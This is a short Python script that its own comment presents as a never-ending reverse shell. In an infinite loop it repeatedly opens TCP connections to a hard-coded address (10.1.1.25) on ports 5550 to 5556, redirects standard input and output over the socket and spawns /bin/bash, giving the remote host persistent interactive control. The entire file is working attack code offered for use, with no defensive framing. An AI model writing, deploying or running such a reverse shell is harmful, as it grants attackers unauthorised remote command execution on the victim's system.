#!/usr/bin/env python3

# This reverse shell will never stop "while 1==1" and will send you a new connection every how many seconds your "sleep"
# variable is set for. It will start at the default port of 5550 and continue up for "port_start" to "port_start + high_port". 

ip = ('10.1.1.25')
port_start = 5550
low_port  = 0
high_port = 7
sleeper = 2

import socket,pty,os,sys,re,time
# pty, not subprocess
from multiprocessing import Process

if sys.version_info.major == 2:
	import thread
else:
	import threading

while 1 == 1:
	def start_reverse_shell(ip, port) :
		try:
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
			s.connect((ip,port)) 
			os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2) 
			x=pty.spawn("/bin/bash")
		except:
			pass

	thread_ids  = []
	for i in range(low_port, high_port) :
		time.sleep(sleeper)
		new_thread = Process(target=start_reverse_shell, args= (ip, (port_start+i))) 
		new_thread.start()
		thread_ids.append(new_thread)

